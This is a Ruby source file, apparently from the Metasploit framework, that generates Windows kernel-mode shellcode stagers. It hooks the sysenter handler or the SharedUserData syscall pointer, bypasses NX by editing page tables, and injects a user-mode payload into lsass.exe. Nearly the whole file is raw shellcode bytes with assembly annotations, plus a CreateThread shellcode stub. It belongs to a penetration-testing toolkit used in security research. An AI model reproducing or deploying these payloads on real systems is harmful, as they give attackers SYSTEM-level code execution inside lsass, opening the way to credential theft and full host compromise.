# -*- coding: binary -*-
module Rex
module Payloads
module Win32
module Kernel

#
# Stagers are responsible for reading in another payload and executing it.
# The reading in of the payload may actually be as simple as copying it to
# another location.  The executing of it may be done either directly or
# indirectly.
#
module Stager

  #
  # Works on Vista, Server 2008 and 7.
  #
  # Full assembly source at:
  # /msf3/external/source/shellcode/windows/x86/src/kernel/stager_sysenter_hook.asm
  #
  # This payload works as follows:
  # * Our sysenter handler and ring3 stagers are copied over to safe location.
  # * The SYSENTER_EIP_MSR is patched to point to our sysenter handler.
  # * The ring0 thread we are in is placed in a halted state.
  # * Upon any ring3 proces issuing a sysenter command our ring0 sysenter handler gets control.
  # * The ring3 return address is modified to force our ring3 stub to be called if certain conditions met.
  # * If NX is enabled we patch the respective page table entry to disable it for the ring3 code.
  # * Control is passed to real sysenter handler, upon the real sysenter handler finishing, sysexit will return to our ring3 stager.
  # * If the ring3 stager is executing in the desired process our sysenter handler is removed and the real ring3 payload called.
  #
  def self.stager_sysenter_hook( opts = {} )

    # The page table entry for StagerAddressUser, used to bypass NX in ring3 on PAE enabled systems (should be static).
    pagetable = opts['StagerAddressPageTable'] || 0xC03FFF00

    # The address in kernel memory where we place our ring0 and ring3 stager (no ASLR).
    kstager   = opts['StagerAddressKernel'] || 0xFFDF0400

    # The address in shared memory (addressable from ring3) where we can find our ring3 stager (no ASLR).
    ustager   = opts['StagerAddressUser'] || 0x7FFE0400

    # Target SYSTEM process to inject ring3 payload into.
    process   = (opts['RunInWin32Process'] || 'lsass.exe').unpack('C*')

    # A simple hash of the process name based on the first 4 wide chars.
    # Assumes process is located at '*:\windows\system32\'.
    checksum  = process[0] + ( process[2] << 8 )  + ( process[1] << 16 ) + ( process[3] << 24 )

    # The ring0 -> ring3 payload blob.
    r0 =	"\xFC\xFA\xEB\x1E\x5E\x68\x76\x01\x00\x00\x59\x0F\x32\x89\x46\x60" +
        "\x8B\x7E\x64\x89\xF8\x0F\x30\xB9\x41\x41\x41\x41\xF3\xA4\xFB\xF4" +
        "\xEB\xFD\xE8\xDD\xFF\xFF\xFF\x6A\x00\x9C\x60\xE8\x00\x00\x00\x00" +
        "\x58\x8B\x58\x57\x89\x5C\x24\x24\x81\xF9\xDE\xC0\xAD\xDE\x75\x10" +
        "\x68\x76\x01\x00\x00\x59\x89\xD8\x31\xD2\x0F\x30\x31\xC0\xEB\x34" +
        "\x8B\x32\x0F\xB6\x1E\x66\x81\xFB\xC3\x00\x75\x28\x8B\x58\x5F\x8D" +
        "\x5B\x6C\x89\x1A\xB8\x01\x00\x00\x80\x0F\xA2\x81\xE2\x00\x00\x10" +
        "\x00\x74\x11\xBA\x45\x45\x45\x45\x81\xC2\x04\x00\x00\x00\x81\x22" +
        "\xFF\xFF\xFF\x7F\x61\x9D\xC3\xFF\xFF\xFF\xFF\x42\x42\x42\x42\x43" +
        "\x43\x43\x43\x60\x6A\x30\x58\x99\x64\x8B\x18\x39\x53\x0C\x74\x2E" +
        "\x8B\x43\x10\x8B\x40\x3C\x83\xC0\x28\x8B\x08\x03\x48\x03\x81\xF9" +
        "\x44\x44\x44\x44\x75\x18\xE8\x0A\x00\x00\x00\xE8\x10\x00\x00\x00" +
        "\xE9\x09\x00\x00\x00\xB9\xDE\xC0\xAD\xDE\x89\xE2\x0F\x34\x61\xC3"

    # The ring3 payload.
    r3  = ''
    r3 += _createthread() if opts['CreateThread'] == true
    r3 += opts['UserModeStub'] || ''

    # Patch in the required values.
    r0 = r0.gsub( [ 0x41414141 ].pack("V"), [ ( r0.length + r3.length - 0x1C ) ].pack("V") )
    r0 = r0.gsub( [ 0x42424242 ].pack("V"), [ kstager ].pack("V") )
    r0 = r0.gsub( [ 0x43434343 ].pack("V"), [ ustager ].pack("V") )
    r0 = r0.gsub( [ 0x44444444 ].pack("V"), [ checksum ].pack("V") )
    r0 = r0.gsub( [ 0x45454545 ].pack("V"), [ pagetable ].pack("V") )

    # Return the ring0 -> ring3 payload blob with the real ring3 payload appended.
    return r0 + r3
  end

  #
  # XP SP2/2K3 SP1 ONLY
  #
  # Returns a kernel-mode stager that transitions from r0 to r3 by placing
  # code in an unused portion of SharedUserData and then pointing the
  # SystemCall attribute to that unused portion.  This has the effect of
  # causing the custom code to be called every time a user-mode process
  # tries to make a system call.  The returned payload also checks to make
  # sure that it's running in the context of lsass before actually running
  # the embedded payload.
  #
  def self.sud_syscall_hook(opts = {})
    r0_recovery = opts['RecoveryStub'] || Recovery.default
    r3_payload  = opts['UserModeStub'] || ''
    r3_prefix   = _run_only_in_win32proc_stub("\xff\x25\x08\x03\xfe\x7f", opts)
    r3_size     = ((r3_prefix.length + r3_payload.length + 3) & ~0x3) / 4

    r0_stager =
      "\xEB" + [0x22 + r0_recovery.length].pack('C') + # jmp short 0x27
      "\xBB\x01\x03\xDF\xFF"                         + # mov ebx,0xffdf0301
      "\x4B"                                         + # dec ebx
      "\xFC"                                         + # cld
      "\x8D\x7B\x7C"                                 + # lea edi,[ebx+0x7c]
      "\x5E"                                         + # pop esi
      "\x6A" + [r3_size].pack('C')                   + # push byte num_dwords
      "\x59"                                         + # pop ecx
      "\xF3\xA5"                                     + # rep movsd
      "\xBF\x7C\x03\xFE\x7F"                         + # mov edi,0x7ffe037c
      "\x39\x3B"                                     + # cmp [ebx],edi
      "\x74\x09"                                     + # jz
      "\x8B\x03"                                     + # mov eax,[ebx]
      "\x8D\x4B\x08"                                 + # lea ecx,[ebx+0x8]
      "\x89\x01"                                     + # mov [ecx],eax
      "\x89\x3B"                                     + # mov [ebx],edi
      r0_recovery +
      "\xe8" + [0xffffffd9 - r0_recovery.length].pack('V') + # call 0x2
      r3_prefix +
      r3_payload

    return r0_stager
  end

protected

  #
  # Stub to run a prepended ring3 payload in a new thread.
  #
  # Full assembly source at:
  # /msf3/external/source/shellcode/windows/x86/src/single/createthread.asm
  #
  def self._createthread
    r3 =    "\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
        "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
        "\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
        "\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
        "\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
        "\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
        "\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
        "\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
        "\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
        "\x31\xC0\x50\x50\x50\x8D\x9D\xA0\x00\x00\x00\x53\x50\x50\x68\x38" +
        "\x68\x0D\x16\xFF\xD5\xC3\x58"
    return r3
  end

  #
  # This stub is used by stagers to check to see if the code is
  # running in the context of a user-mode system process.  By default,
  # this process is lsass.exe.  If it isn't, it runs the code
  # specified by append.  Otherwise, it jumps past that code and
  # into what should be the expected r3 payload to execute.  This
  # stub also makes sure that the payload does not run more than
  # once.
  #
  def self._run_only_in_win32proc_stub(append = '', opts = {})
    opts['RunInWin32Process'] = "lsass.exe" if opts['RunInWin32Process'].nil?

    process  = opts['RunInWin32Process'].downcase
    checksum =
      process[0]         +
      (process[2] << 8)  +
      (process[1] << 16) +
      (process[3] << 24)

    "\x60"                                 + # pusha
    "\x6A\x30"                             + # push byte +0x30
    "\x58"                                 + # pop eax
    "\x99"                                 + # cdq
    "\x64\x8B\x18"                         + # mov ebx,[fs:eax]
    "\x39\x53\x0C"                         + # cmp [ebx+0xc],edx
    "\x74\x26"                             + # jz 0x5f
    "\x8B\x5B\x10"                         + # mov ebx,[ebx+0x10]
    "\x8B\x5B\x3C"                         + # mov ebx,[ebx+0x3c]
    "\x83\xC3\x28"                         + # add ebx,byte +0x28
    "\x8B\x0B"                             + # mov ecx,[ebx]
    "\x03\x4B\x03"                         + # add ecx,[ebx+0x3]
    "\x81\xF9" + [checksum].pack('V')      + # cmp ecx,prochash
    "\x75\x10"                             + # jnz 0x5f
    "\x64\x8B\x18"                         + # mov ebx,[fs:eax]
    "\x43"                                 + # inc ebx
    "\x43"                                 + # inc ebx
    "\x43"                                 + # inc ebx
    "\x80\x3B\x01"                         + # cmp byte [ebx],0x1
    "\x74\x05"                             + # jz 0x5f
    "\xC6\x03\x01"                         + # mov byte [ebx],0x1
    "\xEB" + [append.length + 1].pack('C') + # jmp stager
    "\x61" + append						        # restore regs
  end


end

end
end
end
end
